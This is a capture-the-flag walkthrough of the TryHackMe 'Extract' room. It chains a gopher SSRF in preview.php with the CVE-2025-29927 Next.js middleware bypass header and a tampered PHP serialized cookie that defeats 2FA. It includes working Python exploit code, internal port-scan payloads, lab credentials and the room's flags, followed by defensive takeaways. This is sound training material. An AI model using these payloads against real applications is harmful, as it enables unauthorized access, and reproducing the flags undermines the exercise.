---
title: "TryHackMe Extract: gopher SSRF to middleware bypass"
date: 2026-10-29T04:35:00+05:30
lastmod: 2026-10-29T04:35:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-extract/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - SSRF
  - gopher protocol
  - CVE-2025-29927
  - Next.js middleware bypass
  - PHP deserialization
  - 2FA bypass
  - Chaining Vulnerabilities
  - Web Application Red Teaming

draft: false
description: "TryHackMe Extract walkthrough: gopher SSRF through preview.php, CVE-2025-29927 Next.js middleware bypass, PHP serialized cookie 2FA bypass."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Extract |![Extract room icon](https://cdn-images.tryhackme.com/room-icons/645b19f5d5848d004ab9c9e2-1750729396083)|

This hard-difficulty room in the Chaining Vulnerabilities module of the Web Application Red Teaming path chains three distinct vulnerabilities into a full secret extraction: an SSRF in preview.php, CVE-2025-29927 (Next.js middleware authentication bypass), and a PHP serialized cookie manipulation to defeat 2FA. The room sits after [Chaining Vulnerabilities](/post/thm-room-chainingvulnerabilitieszp/) in the path, and the next room is Voyage.

## Task 1: Extract the Secrets

### Reconnaissance

The target runs an Online Library web application on port 80. The landing page at `index.php` displays a grid of book covers with a "Read More" button on each. Clicking a book calls a JavaScript function `openPdf(url)` that loads `preview.php?url=<pdf_url>` in an iframe. This is the SSRF entry point: `preview.php` uses curl to fetch whatever URL the `url` parameter provides.

### URL filter discovery

The application blocks several URL schemes. Testing each one reveals a keyword filter that rejects `file:/`, `php://`, `data://`, `dict://`, and `ftp://` (case-insensitive). The filter checks for these substrings in the URL parameter. Crucially, `gopher://` is not on the list, which gives us a raw TCP channel to any port on localhost.

### Internal port scanning via gopher

Using gopher SSRF to probe internal ports reveals a service on port 10000. A basic scan sends `gopher://127.0.0.1:<port>/_GET / HTTP/1.1%0D%0AHost: 127.0.0.1%0D%0A%0D%0A` for each candidate port through `preview.php`. Port 10000 returns a full HTML page: a Next.js application titled "TryBookMe" with a navbar linking to Home and "API" (`/customapi`).

### The management panel

The web application also has a `/management/` directory with a login form. Accessing it directly from the browser returns a message that the management panel is restricted to localhost (IP-based access control checking for 127.0.0.1). This means the management panel is only accessible through the SSRF.

{{< ad >}}

### CVE-2025-29927: Next.js middleware bypass

The Next.js application on port 10000 uses middleware to protect all routes. Every request to `/customapi` returns a redirect to the home page, because the middleware intercepts it before the route handler runs.

CVE-2025-29927 is a Next.js middleware authentication bypass. Adding the header `x-middleware-subrequest: middleware` to any request tells Next.js to skip middleware processing entirely, as the framework treats the request as an internal subrequest that has already been authenticated. This bypasses any authentication or authorization logic implemented in middleware.

Sending a gopher GET request to port 10000's `/customapi` endpoint with this header:

```python
  import requests, urllib.parse

  TARGET = "http://TARGET_IP/preview.php"

  def gopher_get(port, path, headers=""):
      raw = "GET " + path + " HTTP/1.1\r\nHost: 127.0.0.1:" + str(port) + "\r\n" + headers + "\r\n"
      encoded = urllib.parse.quote(raw, safe='')
      url = "gopher://127.0.0.1:" + str(port) + "/_" + encoded
      r = requests.get(TARGET, params={"url": url}, timeout=15)
      return r.text

  hdr = "x-middleware-subrequest: middleware\r\n"
  resp = gopher_get(10000, "/customapi", hdr)
  print(resp[:3000])
```

The response contains: "This API is currently under maintenance. Please use the library portal to add new books using librarian:L1br4r1AN!!" and the first flag.

Two things extracted: credentials (`librarian:L1br4r1AN!!`) and the first flag.

### Logging into the management panel

With credentials in hand, the next step is logging into the localhost-restricted management panel at `/management/`. A gopher POST request sends the login form data through the SSRF:

```python
  def gopher_post(port, path, body, extra_headers=""):
      raw = ("POST " + path + " HTTP/1.1\r\n"
             "Host: 127.0.0.1\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n"
             "Content-Length: " + str(len(body)) + "\r\n"
             + extra_headers + "\r\n" + body)
      encoded = urllib.parse.quote(raw, safe='')
      url = "gopher://127.0.0.1:" + str(port) + "/_" + encoded
      r = requests.get(TARGET, params={"url": url}, timeout=15)
      return r.text

  body = "username=librarian&password=L1br4r1AN!!"
  resp = gopher_post(80, "/management/", body)
```

The server responds with HTTP 302 and two cookies: `PHPSESSID` and `auth_token`. The `auth_token` cookie is a URL-encoded PHP serialized object: `O:9:"AuthToken":1:{s:9:"validated";b:0;}`. The `b:0` means the `validated` property is set to `false`, because the user has not yet completed 2FA.

### 2FA bypass via PHP serialized cookie manipulation

The redirect points to `2fa.php`, which presumably presents a one-time code input. But we do not need to solve the 2FA challenge. The `validated` field in the serialized `AuthToken` object is checked server-side to determine whether 2FA has been completed. Changing `b:0` to `b:1` in the cookie tells the server the 2FA step is already done.

A gopher GET request to `/management/2fa.php` with the modified cookie:

```python
  SESSID = "a4mhmeqt2med6atibg1et3fq44"
  MOD_TOKEN = "O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A1%3B%7D"
  cookie_hdr = "Cookie: PHPSESSID=" + SESSID + "; auth_token=" + MOD_TOKEN + "\r\n"

  resp = gopher_get(80, "/management/2fa.php", cookie_hdr)
```

The page title reads "2FA Complete" and the body contains the second flag.

### Answers

- **What is the first flag?** **THM{363bec60df12c2cadbe9ff35393fa468}**
- **What is the second flag?** **THM{804326748394ff9fb288e059653f0db7}**

## Takeaways

**A URL scheme blocklist that omits gopher is not a blocklist at all.** The application filters `file://`, `php://`, `data://`, `dict://`, and `ftp://` to prevent SSRF abuse. But gopher gives the attacker a raw TCP socket to any internal port, which is strictly more powerful than any of the blocked schemes. `file://` reads local files; gopher reads local files AND sends arbitrary HTTP requests to internal services, complete with custom headers, POST bodies, and cookies. The correct defense is an allowlist (permit only `http://` and `https://` to a set of approved external hosts), not a blocklist that tries to enumerate dangerous schemes. Every scheme you forget to block is a full bypass.

**A serialized object in a cookie is a client-controlled authentication decision.** The management panel stores its 2FA validation state in a PHP serialized object inside the `auth_token` cookie: `validated` is `b:0` before 2FA and `b:1` after. The server trusts whatever value the client sends. Changing one byte from `0` to `1` bypasses the entire second factor. The fix is to store authentication state server-side (in the session, not the cookie) and sign or encrypt any client-side tokens so they cannot be modified without detection. A serialized object that the client can read and rewrite is not a security control; it is a suggestion.

Room solved 100%: 1 task, 2 answers.
